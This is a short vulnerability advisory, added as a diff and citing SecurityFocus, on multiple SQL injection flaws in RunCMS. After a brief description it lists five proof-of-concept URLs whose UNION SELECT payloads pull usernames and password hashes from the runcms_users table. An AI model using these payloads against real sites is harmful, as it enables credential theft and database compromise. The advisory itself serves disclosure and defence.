@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/14631/info
+
+RunCMS is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.
+
+Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation. 
+
+http://www.example.com/runcms/modules/newbb_plus/newtopic.php?forum=-99%20UNION%20SELECT%201,1,1,1,1,1,1,1,1,1,1,1,1,1,1,pass,1,1%20FROM%20runcms_users%20WHERE%201/*
+http://www.example.com/runcms/modules/newbb_plus/edit.php?forum=-99%20UNION%20SELECT%201,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20FROM%20runcms_users%20WHERE%201/*&post_id=2'&topic_id=2&viewmode=flat&order=0
+http://www.example.com/runcms/modules/newbb_plus/reply.php?forum=-99%20UNION%20SELECT%201,1,1,1,1,1,1,1,1,1,1,1,1,1,1,pass,1,1%20FROM%20runcms_users%20WHERE%201/*&post_id=2&topic_id=2&viewmode=flat&order=0
+http://www.example.com/runcms/modules/messages/print.php?msg_id=-99%20UNION%20SELECT%201,uname,1,1,1,pass%20FROM%20runcms_users%20WHERE%201/*&op=print_pn
+http://www.example.com/runcms/modules/messages/print.php?msg_id=-99%20UNION%20SELECT%201,uname,1,1,1,pass%20FROM%20runcms_users%20WHERE%201/*&op=print_sent_pn 
